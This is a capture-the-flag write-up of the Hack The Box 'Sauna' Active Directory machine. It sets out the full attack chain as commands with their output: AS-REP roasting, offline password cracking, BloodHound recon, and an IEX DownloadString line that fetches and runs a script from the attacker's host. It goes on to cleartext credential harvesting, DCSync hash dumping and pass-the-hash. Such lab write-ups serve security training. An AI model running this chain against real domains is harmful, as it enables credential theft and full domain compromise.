---
title: "[HTB] Sauna"
permalink: /writeups/htb/sauna/
excerpt: "Quick write-up for the Sauna machine from Hack The Box."
tags:
  - hackthebox
  - activedirectory
  - pentest
  - writeup
---

---


{% include toc icon="cog" title="Sauna Solution" %}

The [Sauna](https://app.hackthebox.com/machines/Sauna) machine has been created by [egotisticalSW](https://app.hackthebox.com/users/94858). This is an **easy** Windows Machine with a strong focus on Active Directory enumeration and exploitation.

If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/arsenal/blob/master/mindmap/pentest_ad_black.png?raw=true) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.

![image-center](/images/htb/htb_sauna_infocard.png){: .align-center}

**Note:** All the actions performed against the target machine have been done with a standard *Kali Linux* machine. You can download Kali from the official website [here](https://www.kali.org/).
{: .notice--info}

# Recon/Enumeration

Reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. Such information may include details of the victim organization, infrastructure, or staff/personnel. This information can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute Initial Access, to scope and prioritize post-compromise objectives, or to drive and lead further Reconnaissance efforts.

Here, we don't have any credentials or hints about how to approach this machine, it's fairly common on HTB boxes. The first step would be reconnaissance, to check what we can see with the info we have, meaning, an IP address.

## Scan with Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/) in order to reveal some of the TCP ports open on the machine.

```bash
$ nmap -Pn -sV 10.129.230.120
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-19 15:28 EST
Nmap scan report for 10.129.230.120
Host is up (0.037s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-02-20 03:28:57Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.03 seconds
```

As we can see, the output reveals an LDAP open port (TCP/389) with the **egotistical-bank.local** domain name and an HTTP (TCP/80) port.


## LDAP

First, we try an anonymous bind on the LDAP port using [ldapsearch](https://linux.die.net/man/1/ldapsearch).

```bash
$ ldapsearch -h 10.129.230.120 -p 389 -x -b "dc=egotistical-bank,dc=local"
# extended LDIF
#
# LDAPv3
# base <dc=egotistical-bank,dc=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# EGOTISTICAL-BANK.LOCAL
dn: DC=EGOTISTICAL-BANK,DC=LOCAL
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL

...[snip]...

```

It seems to be working. Let's see if we can enumerate some users for further attacks... Here, we used [windapsearch](https://github.com/ropnop/windapsearch), a Python script to help enumerate users, groups and computers from a Windows domain through LDAP queries.

```bash
$ ./windapsearch.py -d egotistical-bank.local --dc-ip 10.129.230.120 -U
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.129.230.120
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=EGOTISTICAL-BANK,DC=LOCAL
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      None

[+] Enumerating all AD users

[*] Bye!
```

No results...

## RPCClient

The **MSRPC** (TPC/135) port is open. According this [Pentesting Cheatsheet](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets#rpc-netbios-smb), we could try to establish a null session using the *rpcclient* tool to enumerate some users.

```bash
$ rpcclient -U "" -N -c enumdomusers 10.129.230.120                     
result was NT_STATUS_ACCESS_DENIED
```

Still no results.

## SMB

Maybe we can try to find some open shares via an anonymous login on the target machine with `smbclient`.

```bash
$ smbclient -N -L \\\\10.129.230.120
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      ------
```

Again, no results.

## HTTP

Let's go to the HTTP port to see if there is something to be found.

![image-center](/images/htb/htb_sauna_website.png){: .align-center}

There is a list of employees' name which could be used to generate a list of users. Here, we used common pattern of account name in order to perform further attacks.

```bash
fergus.smith 
shau.coins 
hugo.bear 
bowie.taylor 
sophie.driver 
steve.kerb 
fsmith 
scoins 
hbear 
btaylor 
sdriver 
skerb
ferguss
shaunc 
hugob
bowiet 
sophied 
stevek 
```

## ASREPRoast

With the previously generated user list, we could try to do some brute force or password spraying attacks. But first, since we don't have any credentials, let's try an [ASREPRoast attack](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat).

As a reminder, AS-REP roasting is a technique that allows retrieving password hashes for users that have the **Do not require Kerberos preauthentication** property selected. It means that we can recover a hash which can be cracked offline.

One of the best tool for the job would be [impacket-GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py), which should already be installed on Kali.

```bash
$ impacket-GetNPUsers egotistical-bank.local/ -usersfile users.txt -dc-ip 10.129.230.120
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:747acc403bb7d32d8741dbe1adcb7528$ada735b4946897d4dbb6ee9efe4e556e1f4c11ff284c3dd27d88b1969d231d214890f65f61ef9e81721018bd343b84a35cf9a86510b0c0d22ef045dbf60f07873873d0a2990750dc905c9a759e1a569eb95d6a6967d8d47f40ea85bf17cf00e7730d27b0ab87ee2e75b7789db80d6b0b20286548d9956649991c115c9ad2b034d5a2ca651c384b3d40ac0b65d1707b326fd614943a9b2e876bbeeb148389053223030b1e6afc8d615dc43dd45127286237b9ea3f8fd08850d7aedaf842890363b239dbb9e62cdf0abfcd1315635c617f7c105a7a5dff42d91305282f5f99a769cdec5b6f19188be6fcf47afafc3ac84fc4d6973a1f3855ac46e928eb2e456168

...[snip]...

```

Nice, we do have a hash for the **fsmith** user.

## Password Cracking

Now, we just have to copy/paste the following hash in a file and try to crack it offline using the *rockyou* password list (if you are using Kali Linux, it should be present in the `/usr/share/wordlists/` folder). 

```text
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:747acc403bb7d32d8741dbe1adcb7528$ada735b4946897d4dbb6ee9efe4e556e1f4c11ff284c3dd27d88b1969d231d214890f65f61ef9e81721018bd343b84a35cf9a86510b0c0d22ef045dbf60f07873873d0a2990750dc905c9a759e1a569eb95d6a6967d8d47f40ea85bf17cf00e7730d27b0ab87ee2e75b7789db80d6b0b20286548d9956649991c115c9ad2b034d5a2ca651c384b3d40ac0b65d1707b326fd614943a9b2e876bbeeb148389053223030b1e6afc8d615dc43dd45127286237b9ea3f8fd08850d7aedaf842890363b239dbb9e62cdf0abfcd1315635c617f7c105a7a5dff42d91305282f5f99a769cdec5b6f19188be6fcf47afafc3ac84fc4d6973a1f3855ac46e928eb2e456168
```

Here, we used [John the Ripper](https://github.com/openwall/john) to crack the password, but it can be done with other tools.

```bash
$ john hash.txt -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)     
1g 0:00:00:17 DONE (2022-02-04 17:54) 0.05837g/s 615236p/s 615236c/s 615236C/s Thing..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Great, we now have credentials (`fsmith:Thestrokes23`). Using another awesome tool, [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), we can check if the user's password is properly working.

```bash
$ crackmapexec smb 10.129.230.120 -u fsmith -p Thestrokes23 -d egotistical-bank.local 
SMB         10.129.230.120   445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:egotistical-bank.local) (signing:True) (SMBv1:False)
SMB         10.129.230.120   445    SAUNA            [+] egotistical-bank.local\fsmith:Thestrokes23 
```

The password is valid, nice. Maybe we can have more information about the target machine with this access.

# More Recon

Lots of people think that the recon is a one time "thing", that's not true. When you do a pentest you have to re-think the whole context each time you get new privileges and re-do the recon phase. With new privileges, you don't know where you are or what you can have access to.

## Active Directory Recon

With a valid account, we can now use one of the [BloodHound](https://github.com/BloodHoundAD/BloodHound) ingestors and gather more information about the Active Directory. Here, we use a Python based ingestor for BloodHound, [BloodHound.py](https://github.com/fox-it/BloodHound.py).

```bash
$ bloodhound-python -c All -u fsmith -p Thestrokes23 -d egotistical-bank.local -ns 10.129.230.120 --zip
INFO: Found AD domain: egotistical-bank.local
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 6 users
INFO: Connecting to GC LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 51 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Done in 00M 03S
INFO: Compressing output into 20220204181855_bloodhound.zip
```

Now, you can import the generated file (*20220204181855_bloodhound.zip*) in BloodHound by running `sudo neo4j console`, then execute BloodHound in another terminal with `bloodhound`.

# Gaining Access

Let's see if we can gain our initial foothold on the machine by indentifying interesting privileges or attacks paths, starting with our compromised user.

## WinRM Access

With a bit of analysis in BloodHound, we can see that the **fsmith** can PS-Remote to **sauna.egotistical-bank.local** machine.

![image-center](/images/htb/htb_sauna_bloodhound_00.png){: .align-center}

Using [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) and the recovered account, we can try to connect to the remote machine.

```bash
$ evil-winrm -i 10.129.230.120 -u fsmith -p Thestrokes23 

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents> dir ../Desktop


    Directory: C:\Users\FSmith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         2/4/2022   9:31 PM             34 user.txt
```

Nice, we have a remote shell access and the **first flag**.

# Privilege Escalation

Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.

## Getting Administrator Privileges

It's time to elevate our privileges and get an administrator access. Using [PrivescCheck](https://github.com/itm4n/PrivescCheck), a script that aims to enumerate common Windows configuration issues, let's try to enumerate common Windows configuration issues that can be leveraged for local privilege escalation.

Note that we used the local **Apache** service to host the file and download it from the remote machine. The `-Extended` flag aims to gather more information.

```bash
*Evil-WinRM* PS C:\Users\FSmith\Documents> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.xx/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended

...[snip]...

+------+------------------------------------------------+------+
| TEST | CREDS > WinLogon                               | VULN |
+------+------------------------------------------------+------+
| DESC | Parse the Winlogon registry keys and check whether    |
|      | they contain any clear-text password. Entries that    |
|      | have an empty password field are filtered out.        |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


Domain   : EGOTISTICALBANK
Username : EGOTISTICALBANK\svc_loanmanager
Password : Moneymakestheworldgoround!

...[snip]...

```

It seems that we have cleartext credentials for the **svc_loanmanager** account. By checking the local users using the `net users` command, we can see a user named **svc_loanmgr** which may correspond to the previously found credentials.

```bash
*Evil-WinRM* PS C:\Users\FSmith\Documents> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
The command completed with one or more errors.
```

Let's do a quick check, just to be sure.

```bash
$ crackmapexec smb 10.129.230.120 -u svc_loanmgr -p 'Moneymakestheworldgoround!' -d egotistical-bank.local
SMB         10.129.230.120  445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:egotistical-bank.local) (signing:True) (SMBv1:False)
SMB         10.129.230.120  445    SAUNA            [+] egotistical-bank.local\svc_loanmgr:Moneymakestheworldgoround! 
```

The credentials are valid. Back to BloodHound, we can see that **svc_loanmgr** account have the *GetChangesAll* privilege on the target domain.

![image-center](/images/htb/htb_sauna_bloodhound_01.png){: .align-center}

Using BloodHound help, we can check what we can do with this privilege.

![image-center](/images/htb/htb_sauna_bloodhound_help.png){: .align-center}

Interesting, it seems that we could try to perform a [DCSync](https://attack.mitre.org/techniques/T1003/006/) attack. 

## Dump the Administrator Hash

Here, we used [impacket-secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py), another tool from the *Impacket* suite to dump the **Administrator** password using **svc_loanmgr**.

```bash
$ impacket-secretsdump EGOTISTICALBANK/svc_loanmgr@10.129.230.120 -just-dc-user Administrator -just-dc-ntlm
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[*] Cleaning up...
```

Perfect, now we can use this NTLM hash to read the **second flag** from the Domain Controller.

```bash
$ crackmapexec smb 10.129.230.120 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e -d egotistical-bank.local -x "dir C:\Users\Administrator\Desktop" 
SMB         10.129.230.120   445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:egotistical-bank.local) (signing:True) (SMBv1:False)
SMB         10.129.230.120   445    SAUNA            [+] egotistical-bank.local\Administrator:823452073d75b9d1cf70ebdf86c7f98e (Pwn3d!)
SMB         10.129.230.120   445    SAUNA            [+] Executed command 
SMB         10.129.230.120   445    SAUNA            Volume in drive C has no label.
SMB         10.129.230.120   445    SAUNA            Volume Serial Number is 489C-D8FC
SMB         10.129.230.120   445    SAUNA            
SMB         10.129.230.120   445    SAUNA            Directory of C:\Users\Administrator\Desktop
SMB         10.129.230.120   445    SAUNA            
SMB         10.129.230.120   445    SAUNA            07/14/2021  02:35 PM    <DIR>          .
SMB         10.129.230.120   445    SAUNA            07/14/2021  02:35 PM    <DIR>          ..
SMB         10.129.230.120   445    SAUNA            02/06/2022  06:03 PM                34 root.txt
SMB         10.129.230.120   445    SAUNA            1 File(s)             34 bytes
SMB         10.129.230.120   445    SAUNA            2 Dir(s)   7,754,547,200 bytes free
```

Awesome ! I hope you enjoyed it, I know I did :)